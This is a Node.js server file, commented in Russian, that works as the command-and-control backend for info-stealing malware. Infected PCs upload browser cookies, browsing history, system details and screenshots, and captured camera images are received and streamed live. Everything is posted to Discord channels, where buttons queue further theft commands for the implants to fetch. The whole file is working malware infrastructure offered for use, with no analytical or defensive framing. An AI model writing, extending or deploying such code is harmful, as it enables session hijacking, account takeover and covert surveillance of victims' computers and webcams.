// server.js
import express from "express";
import {
    Client,
    GatewayIntentBits,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    ChannelType
} from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: "100mb" }));
app.use(express.static(path.join(__dirname, "public")));

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;

const CATEGORY_ONLINE_PC = " | Все ПК | ";
const CATEGORY_OFFLINE_PC = " | Оффлайн ПК | ";
const CATEGORY_ACTIVE_CAM = " | Камеры | ";
const CATEGORY_ARCHIVE_CAM = " | Архив камер | ";
const LOG_CATEGORY = " | Логи | ";
const LOG_CHANNEL = "server-logs";

const MAX_FILE_SIZE = 6 * 1024 * 1024;
const CAM_INACTIVE_THRESHOLD = 2 * 60 * 1000;
const PC_OFFLINE_THRESHOLD = 2 * 60 * 1000;

// ---------- Состояние ----------
const onlinePCs = {};
const pendingCommands = {};
const pcData = {};
const channelByPC = {};
const channelByCam = {};
const wsCameraClients = {};
const camLastUpload = {};

let categoryCache = {};
let logChannelCache = null;

// ---------- Discord Bot ----------
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));
bot.login(DISCORD_BOT_TOKEN);

// ---------- Утилиты ----------
function safeChannelName(prefix, id) {
    return `${prefix}-${id}`
        .toLowerCase()
        .replace(/[^a-z0-9\-]/g, "-")
        .slice(0, 90);
}

async function logToDiscord(msg) {
    try {
        const guild = await bot.guilds.fetch(GUILD_ID);
        const channel = await getOrCreateLogChannel(guild);
        await channel.send(`[${new Date().toISOString()}] ${msg}`);
    } catch (e) {
        console.error("Ошибка логирования:", e);
    }
}

async function getOrCreateCategory(guild, name) {
    if (categoryCache[name]) return categoryCache[name];

    const channels = await guild.channels.fetch();
    let category = channels.find(
        (c) => c.type === ChannelType.GuildCategory && c.name === name
    );

    if (!category) {
        category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
        await logToDiscord(`Создана категория ${name}`);
    }

    categoryCache[name] = category;
    return category;
}

async function getOrCreateTextChannel(guild, name, parentId) {
    const channels = await guild.channels.fetch();
    let channel = channels.find(
        (c) => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId
    );

    if (!channel) {
        channel = await guild.channels.create({
            name,
            type: ChannelType.GuildText,
            parent: parentId,
        });
        await logToDiscord(`Создан канал ${name}`);
    }
    return channel;
}

async function getOrCreateLogChannel(guild) {
    if (logChannelCache) return logChannelCache;
    const category = await getOrCreateCategory(guild, LOG_CATEGORY);

    const channels = await guild.channels.fetch();
    let channel = channels.find(
        (c) => c.type === ChannelType.GuildText && c.name === LOG_CHANNEL && c.parentId === category.id
    );

    if (!channel) {
        channel = await guild.channels.create({
            name: LOG_CHANNEL,
            type: ChannelType.GuildText,
            parent: category.id,
        });
    }

    logChannelCache = channel;
    return channel;
}

// ---------- Кнопки ----------
function createControlButtons(pcId) {
    const safePcId = encodeURIComponent(pcId);
    return [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Куки").setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("История").setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная").setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
        ),
    ];
}

// ---------- Обработка кнопок ----------
bot.on("interactionCreate", async (interaction) => {
    if (!interaction.isButton()) return;
    const [command, encodedPcId] = interaction.customId.split("|");
    const pcId = decodeURIComponent(encodedPcId);

    if (!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);

    await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral: true });
});

// ---------- Upload PC ----------
app.post("/upload-pc", async (req, res) => {
    try {
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if (!pcId) return res.status(400).json({ error: "pcId required" });

        onlinePCs[pcId] = Date.now();
        pcData[pcId] = { cookies, history, systemInfo, screenshot };

        const guild = await bot.guilds.fetch(GUILD_ID);
        const onlineCategory = await getOrCreateCategory(guild, CATEGORY_ONLINE_PC);
        const offlineCategory = await getOrCreateCategory(guild, CATEGORY_OFFLINE_PC);

        const channelName = safeChannelName("pc", pcId);

        // --- перенос старого канала в оффлайн, если есть ---
        if (channelByPC[pcId]) {
            const oldChannel = await guild.channels.fetch(channelByPC[pcId]).catch(() => null);
            if (oldChannel && oldChannel.parentId !== onlineCategory.id) {
                await oldChannel.setParent(offlineCategory.id).catch(() => null);
            }
        }

        // создаём/берём канал для ПК
        const finalChannel = await getOrCreateTextChannel(guild, channelName, onlineCategory.id);
        channelByPC[pcId] = finalChannel.id;

        const logChannel = await getOrCreateLogChannel(guild);
        await logChannel.send(`🚀 ПК подключен: **${pcId}** <@everyone>`);

        const files = [];
        const descriptions = [];
        if (cookies) {
            files.push({ attachment: Buffer.from(JSON.stringify({ cookies }, null, 2)), name: `${channelName}-cookies.json` });
            descriptions.push("🍪 Cookies");
        }
        if (history) {
            files.push({ attachment: Buffer.from(JSON.stringify({ history }, null, 2)), name: `${channelName}-history.json` });
            descriptions.push("📜 История браузера");
        }
        if (systemInfo) {
            files.push({ attachment: Buffer.from(JSON.stringify({ systemInfo }, null, 2)), name: `${channelName}-system.json` });
            descriptions.push("💻 Системная информация");
        }
        if (screenshot) {
            files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` });
            descriptions.push("🖼️ Скриншот");
        }

        await finalChannel.send({ content: `🟢 ПК **${pcId}** данные обновлены\n${descriptions.join("\n")}`, files, components: createControlButtons(pcId) });

        res.json({ success: true });
    } catch (e) {
        await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`);
        res.status(500).json({ error: e.message });
    }
});

// ---------- Upload Cam ----------
app.post("/upload-cam", async (req, res) => {
    try {
        const { camId, screenshot } = req.body;
        if (!camId || !screenshot) return res.status(400).json({ error: "camId and screenshot required" });

        if (wsCameraClients[camId]) wsCameraClients[camId].forEach(ws => { try { ws.send(JSON.stringify({ camId, screenshot })); } catch {} });

        camLastUpload[camId] = Date.now();
        const guild = await bot.guilds.fetch(GUILD_ID);

        const inactive = Date.now() - camLastUpload[camId] > CAM_INACTIVE_THRESHOLD;
        const categoryName = inactive ? CATEGORY_ARCHIVE_CAM : CATEGORY_ACTIVE_CAM;
        const category = await getOrCreateCategory(guild, categoryName);

        const channelName = safeChannelName("cam", camId);
        let finalChannel = null;
        if (channelByCam[camId]) finalChannel = await guild.channels.fetch(channelByCam[camId]).catch(() => null);

        if (!finalChannel || finalChannel.parentId !== category.id) {
            finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
            channelByCam[camId] = finalChannel.id;
            if (!inactive) {
                const logChannel = await getOrCreateLogChannel(guild);
                await logChannel.send(`🚀 Новая камера подключена: **${camId}** <@everyone>`);
            }
        }

        const buffer = Buffer.from(screenshot, "base64");
        if (buffer.length <= MAX_FILE_SIZE)
            await finalChannel.send({ content: `📷 Камера **${camId}** (${new Date().toLocaleTimeString()})`, files: [{ attachment: buffer, name: `${channelName}.jpg` }] });

        res.json({ success: true });
    } catch (e) {
        await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`);
        res.status(500).json({ error: e.message });
    }
});

// ---------- WebSocket ----------
const wss = new WebSocketServer({ noServer: true });
wss.on("connection", (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const camId = url.searchParams.get("camId") || "all";
    if (!wsCameraClients[camId]) wsCameraClients[camId] = [];
    wsCameraClients[camId].push(ws);

    ws.on("close", () => {
        wsCameraClients[camId] = wsCameraClients[camId].filter(c => c !== ws);
    });
});

// ---------- Ping ----------
app.post("/ping", (req, res) => {
    const { pcId } = req.body;
    if (!pcId) return res.status(400).json({ error: "pcId required" });
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({ commands });
});

// ---------- Запуск ----------
const server = http.createServer(app);
server.on("upgrade", (req, socket, head) => {
    wss.handleUpgrade(req, socket, head, ws => wss.emit("connection", ws, req));
});
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));

process.on("uncaughtException", (e) => logToDiscord(`💥 Uncaught Exception: ${e.message}`));
process.on("unhandledRejection", (e) => logToDiscord(`💥 Unhandled Rejection: ${e}`));
